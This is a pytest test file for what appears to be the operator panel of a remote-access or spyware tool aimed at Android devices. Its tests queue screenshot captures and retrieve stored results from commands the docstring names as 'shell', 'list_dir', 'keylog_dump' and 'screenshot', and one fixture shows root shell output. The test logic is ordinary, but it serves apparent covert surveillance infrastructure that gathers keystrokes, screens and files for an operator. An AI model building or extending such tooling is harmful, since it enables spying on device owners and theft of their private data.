"""Panel surface for capture and command results.

The agent already stores every command's result (`Command.result`) and the
panel already receives it over the socket. What was missing was any way to
read it back except the terminal, which renders `shell` and discards
everything else. `shell`, `list_dir`, `keylog_dump` and `screenshot` all return
bytes that never reached the operator.
"""

import json

import pytest


def _complete(app, cmd_id, result, success=True):
    """Finish a command the way the agent's /result endpoint does."""
    from database import db
    from models import Command

    with app.app_context():
        cmd = db.session.get(Command, cmd_id)
        cmd.result = json.dumps(result)[:512 * 1024]
        cmd.status = "done" if success else "failed"
        db.session.commit()


# ------------------------------------------------------------- capture POST

def test_capture_queues_a_screenshot(op, make_device):
    dev = make_device()
    r = op.post(f"/api/device/{dev}/capture", json={})
    assert r.status_code == 200
    assert r.get_json()["pushed"] in (True, False)


def test_capture_needs_no_body(op, make_device):
    """The button sends nothing; the endpoint supplies the command itself."""
    dev = make_device()
    r = op.post(f"/api/device/{dev}/capture", json=None)
    assert r.status_code == 200


def test_capture_requires_a_session(client, make_device):
    dev = make_device()
    assert client.post(f"/api/device/{dev}/capture", json={}).status_code in (302, 401, 403)


def test_capture_requires_csrf(client, make_device):
    from tests.conftest import login

    dev = make_device()
    login(client, csrf=False)
    r = client.post(f"/api/device/{dev}/capture", json={})
    assert r.status_code == 403, "a state-changing route must reject a missing CSRF token"


def test_capture_on_unknown_device_404s(op):
    assert op.post("/api/device/999999/capture", json={}).status_code == 404


# ------------------------------------------------------- capture/status GET

def test_capture_status_is_read_only(op, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "screenshot_status", status="done")
    _complete(app, cmd, {"service_bound": True, "enabled": True, "sdk": 34})

    r = op.get(f"/api/device/{dev}/capture/status")
    assert r.status_code == 200
    body = r.get_json()["status"]
    assert body["service_bound"] is True
    assert body["sdk"] == 34


def test_capture_status_reports_absence_distinctly(op, make_device):
    """'never asked' must not look like 'capture failed'."""
    dev = make_device()
    r = op.get(f"/api/device/{dev}/capture/status")
    assert r.status_code == 404
    assert r.get_json()["error"] == "no_status"


def test_capture_status_ignores_unfinished_commands(op, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "screenshot_status", status="sent")
    _complete(app, cmd, {"service_bound": True})
    with app.app_context():
        from database import db
        from models import Command
        db.session.get(Command, cmd).status = "sent"
        db.session.commit()

    assert op.get(f"/api/device/{dev}/capture/status").status_code == 404


def test_capture_status_survives_a_corrupt_payload(op, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "screenshot_status", status="done")
    with app.app_context():
        from database import db
        from models import Command
        db.session.get(Command, cmd).result = "{not json"
        db.session.commit()

    r = op.get(f"/api/device/{dev}/capture/status")
    assert r.status_code == 200, "a truncated write must not 500 the panel"
    assert "raw" in r.get_json()["status"]


# ------------------------------------------------------- result retrieval

def test_result_is_retrievable(op, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "shell")
    _complete(app, cmd, {"stdout": "id\nuid=0(root)"})

    r = op.get(f"/api/device/{dev}/command/{cmd}")
    body = r.get_json()
    assert r.status_code == 200
    assert body["result"]["stdout"].startswith("id")
    assert body["status"] == "done"


def test_failed_commands_report_their_error(op, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "screenshot")
    _complete(app, cmd, {"error": "no_capture_path"}, success=False)

    body = op.get(f"/api/device/{dev}/command/{cmd}").get_json()
    assert body["status"] == "failed"
    assert body["result"]["error"] == "no_capture_path"


def test_result_is_scoped_to_its_device(op, make_device, make_command, app):
    """Ids are allocated sequentially, so existence must not imply access."""
    a = make_device(device_id="dev-a")
    b = make_device(device_id="dev-b")
    cmd = make_command(a, "shell")
    _complete(app, cmd, {"stdout": "secret"})

    assert op.get(f"/api/device/{b}/command/{cmd}").status_code == 404


def test_unknown_command_id_404s(op, make_device):
    dev = make_device()
    assert op.get(f"/api/device/{dev}/command/424242").status_code == 404


def test_result_handles_a_null_result(op, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "device_info")
    _complete(app, cmd, None)

    body = op.get(f"/api/device/{dev}/command/{cmd}").get_json()
    assert body["result"] is not None, (
        "json.loads('null') is None and the panel renders it as the string "
        "'null' instead of an empty result"
    )
    assert isinstance(body["result"], dict), "the panel expects an object"


def test_truncation_is_flagged(op, make_device, make_command, app):
    """The agent caps stored results; the panel must not present a clipped
    payload as if it were whole."""
    dev = make_device()
    cmd = make_command(dev, "list_dir")
    with app.app_context():
        from database import db
        from models import Command
        db.session.get(Command, cmd).result = json.dumps(
            {"files": ["x" * 32 for _ in range(20000)]})[:512 * 1024]
        db.session.commit()

    assert op.get(f"/api/device/{dev}/command/{cmd}").get_json()["truncated"] is True


def test_short_results_are_not_flagged_truncated(op, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "device_info")
    _complete(app, cmd, {"model": "pixel"})
    assert op.get(f"/api/device/{dev}/command/{cmd}").get_json()["truncated"] is False


def test_result_requires_a_session(client, make_device, make_command, app):
    dev = make_device()
    cmd = make_command(dev, "shell")
    _complete(app, cmd, {"stdout": "x"})
    assert client.get(f"/api/device/{dev}/command/{cmd}").status_code in (302, 401, 403)


# ------------------------------------------------------ terminal regression

def test_terminal_still_renders_shell_output():
    """The one behaviour that worked before must not regress."""
    js = (pytest.importorskip("pathlib")
          .Path("static/js/terminal.js").read_text())
    assert "cmdRow.command_type !== \"shell\"" in js
    assert "res.stdout" in js